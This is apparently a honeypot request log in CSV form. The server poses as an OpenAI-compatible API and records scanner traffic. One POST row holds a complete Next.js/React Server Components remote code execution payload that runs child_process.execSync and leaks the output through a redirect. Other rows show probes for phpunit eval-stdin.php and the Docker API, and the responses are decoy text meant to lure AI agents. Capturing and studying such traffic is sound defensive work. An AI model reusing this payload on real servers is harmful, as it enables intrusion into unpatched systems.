request_id,timestamp_utc,client_ip,method,path,host,user_agent,x_forwarded_for,request_body_size,response_body_size,stream_chunk_count,model,user_content_flat,request_body_text,response_status,response_reason,response_body_text,duration_ms,error
46ff27c9-eba1-4273-9d8e-83d85ca50c42,2026-04-30T13:02:52.405716+00:00,anon_492d3277,GET,/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
4de1bbde-62bd-4f9b-99e2-4db7a68d75e1,2026-04-30T13:02:52.891237+00:00,anon_492d3277,GET,/index.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
813efdaa-8889-4057-a30d-ccd203a5de10,2026-04-30T13:02:53.208272+00:00,anon_492d3277,GET,/public/index.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
4e89413b-0a7f-42f2-9ffe-ca97a4d6fefa,2026-04-30T13:02:53.675398+00:00,anon_492d3277,GET,/index.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
c14e3dc0-880e-4aba-b593-6b71b140cb65,2026-04-30T13:02:54.155412+00:00,anon_492d3277,GET,/index.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
59252221-2b67-4701-8542-e52bd5f970b1,2026-04-30T13:02:54.558491+00:00,anon_492d3277,GET,/containers/json,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
114d66a8-0dd0-4d8b-8908-ef019f7aff71,2026-04-30T13:17:53.205417+00:00,anon_76ce64d8,GET,/,[honeypot-host],"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
10711c31-b256-4874-8069-94e2b7735c92,2026-04-30T13:55:24.605780+00:00,anon_6e9d2d27,GET,/,[honeypot-host],"Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
3971e649-addb-41c8-8b55-bc229435e9a8,2026-04-30T14:05:39.650657+00:00,anon_359ccae1,POST,/,[honeypot-host],"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",anon_de3ef398,806,316,1,,"------WebKitFormBoundaryd7af513660276986
Content-Disposition: form-data; name=""0""

{""_response"":{""_chunks"":""$Q2"",""_formData"":{""get"":""$1:constructor:constructor""},""_prefix"":""var _r=(process.mainModule\u0026\u0026process.mainModule.require)||module.require.bind(module);var res=_r('child_process').execSync('echo $((41*271))',{timeout:15000}).toString().trim();throw Object.assign(new Error('NEXT_REDIRECT'),{digest:`NEXT_REDIRECT;push;/x?out=${encodeURIComponent(res)};307;`});""},""reason"":-1,""status"":""resolved_model"",""then"":""$1:__proto__:then"",""value"":""{\""then\"":\""$B1337\""}""}
------WebKitFormBoundaryd7af513660276986
Content-Disposition: form-data; name=""1""

""$@0""
------WebKitFormBoundaryd7af513660276986
Content-Disposition: form-data; name=""2""

[]
------WebKitFormBoundaryd7af513660276986--","------WebKitFormBoundaryd7af513660276986
Content-Disposition: form-data; name=""0""

{""_response"":{""_chunks"":""$Q2"",""_formData"":{""get"":""$1:constructor:constructor""},""_prefix"":""var _r=(process.mainModule\u0026\u0026process.mainModule.require)||module.require.bind(module);var res=_r('child_process').execSync('echo $((41*271))',{timeout:15000}).toString().trim();throw Object.assign(new Error('NEXT_REDIRECT'),{digest:`NEXT_REDIRECT;push;/x?out=${encodeURIComponent(res)};307;`});""},""reason"":-1,""status"":""resolved_model"",""then"":""$1:__proto__:then"",""value"":""{\""then\"":\""$B1337\""}""}
------WebKitFormBoundaryd7af513660276986
Content-Disposition: form-data; name=""1""

""$@0""
------WebKitFormBoundaryd7af513660276986
Content-Disposition: form-data; name=""2""

[]
------WebKitFormBoundaryd7af513660276986--",404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
4633a5a3-3ba5-4856-8cec-6f9f4c792562,2026-04-30T14:35:37.357703+00:00,anon_53eb0b1c,GET,/,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46",,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
